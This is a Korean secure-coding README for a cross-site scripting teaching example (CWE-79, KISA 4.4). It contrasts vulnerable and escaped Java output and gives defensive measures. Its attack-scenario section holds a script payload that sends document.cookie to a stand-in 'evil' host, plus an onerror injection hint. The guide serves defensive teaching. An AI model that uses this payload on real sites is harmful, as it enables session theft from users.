# 크로스사이트 스크립트(XSS) · CWE-79 · KISA 4.4

## 개념
XSS는 검증·인코딩되지 않은 외부 입력이 웹 페이지에 그대로 출력되어, 피해자의 브라우저에서 공격자의 스크립트가 실행되는 약점이다. 저장형·반사형·DOM 기반으로 나뉜다.

## 취약 원인
- 입력을 HTML 응답에 이스케이프 없이 그대로 삽입했다.
- 출력 문맥(HTML 본문/속성/스크립트/URL)에 맞는 인코딩을 하지 않았다.
- `out.println(request.getParameter(...))` 처럼 원문을 직접 출력했다.

## 공격 시나리오
- 검색어에 `<script>location='//evil/'+document.cookie</script>` 를 넣어 세션 쿠키를 탈취한다.
- 게시글 본문에 스크립트를 저장해 열람하는 모든 사용자를 공격한다(저장형).
- 이미지 속성에 `onerror=` 이벤트 핸들러를 삽입해 코드를 실행한다.

## 안전한 코딩(핵심 조치)
- 출력 직전 문맥에 맞게 이스케이프한다(`escapeHtml`, OWASP Encoder, `StringEscapeUtils`).
- HTML 본문/속성/JS/URL 문맥별로 서로 다른 인코딩을 적용한다.
- 입력 검증(화이트리스트)과 CSP(Content-Security-Policy)를 병행한다.
- 쿠키에 `HttpOnly` 를 설정해 스크립트의 쿠키 접근을 막는다.

## 취약 vs 안전 차이
| 구분 | 취약 (Vulnerable.java) | 안전 (Secure.java) |
|------|------------------------|---------------------|
| 출력 | `out.println(input)` | `out.println(escapeHtml(input))` |
| 특수문자 | 그대로 전달 | `< > & " '` → 엔티티 |
| 결과 | 스크립트 실행 | 텍스트로만 표시 |

## CWE·KISA 매핑
- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- KISA 소프트웨어 개발보안 가이드(2021) 4장 입력검증 및 표현 — 크로스사이트 스크립트

## 실행/컴파일 방법
```
javac Vulnerable.java
javac Secure.java

python bugfinder/bugfinder.py examples/1_input-validation/1.04_CWE-79_xss
```

## 참고
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- OWASP XSS Prevention Cheat Sheet
